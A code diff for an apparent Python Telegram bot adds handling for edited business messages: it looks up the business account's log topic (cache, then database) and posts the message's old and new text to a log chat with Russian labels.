@@ -926,11 +926,58 @@ async def handle_edited_business_message(message):
         new_text,
     )
 
+    # ================== GET EDITED MESSAGE TOPIC ==================
+
+    topic_id = business_topics.get(message.business_connection_id)
+
+    if topic_id is None and db_pool is not None:
+        business_connection = await bot.get_business_connection(
+            business_connection_id=message.business_connection_id
+        )
+
+        user = business_connection.user
+
+        async with db_pool.acquire() as conn:
+            row = await conn.fetchrow(
+                """
+                SELECT topic_id
+                FROM business_accounts
+                WHERE telegram_user_id = $1
+                """,
+                user.id,
+            )
+
+        if row:
+            topic_id = row["topic_id"]
+            business_topics[message.business_connection_id] = topic_id
+
+    if topic_id is None:
+        logger.error(
+            "EDITED MESSAGE TOPIC NOT FOUND | connection=%s | chat=%s | message=%s",
+            message.business_connection_id,
+            message.chat.id,
+            message.message_id,
+        )
+        return
+
+    # ================== SAVE EDIT TO LOG ==================
+
+    await bot.send_message(
+        chat_id=int(LOG_CHAT_ID),
+        message_thread_id=topic_id,
+        text=(
+            "✏️ СООБЩЕНИЕ ИЗМЕНЕНО\n\n"
+            f"🆔 Message ID: {message.message_id}\n\n"
+            "⬅️ БЫЛО:\n"
+            f"{old_text}\n\n"
+            "➡️ СТАЛО:\n"
+            f"{new_text}"
+        ),
+    )
+
     message_history[key] = {
         "text": new_text,
     }
-
-
 # ================== WEBHOOK ==================
 
 @app.get("/")
